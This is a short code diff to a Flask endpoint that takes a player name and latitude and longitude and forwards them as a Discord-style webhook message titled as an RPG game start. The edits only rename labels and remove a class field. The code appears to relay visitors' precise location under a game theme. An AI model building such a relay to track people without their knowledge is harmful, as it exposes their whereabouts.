@@ -57,8 +57,7 @@ def send_data():
     payload = request.get_json(silent=True) or {}
     latitude = payload.get('latitude')
     longitude = payload.get('longitude')
-    player_name = payload.get('name', 'Unknown Explorer')
-    hero_class = payload.get('class', 'Adventurer')
+    player_name = payload.get('name', 'Fullscreen Explorer')
 
     if latitude is None or longitude is None:
         return jsonify({"status": "error", "message": "Missing coordinates"}), 400
@@ -66,11 +65,10 @@ def send_data():
     webhook_payload = {
         "embeds": [
             {
-                "title": "🧭 New Map Explorer Spawned",
-                "color": 3447003,
+                "title": "🗺️ Fullscreen RPG Adventurer Started",
+                "color": 65535,
                 "fields": [
                     {"name": "Hero Name", "value": str(player_name), "inline": False},
-                    {"name": "Class", "value": str(hero_class), "inline": True},
                     {"name": "Latitude", "value": str(latitude), "inline": True},
                     {"name": "Longitude", "value": str(longitude), "inline": True}
                 ]
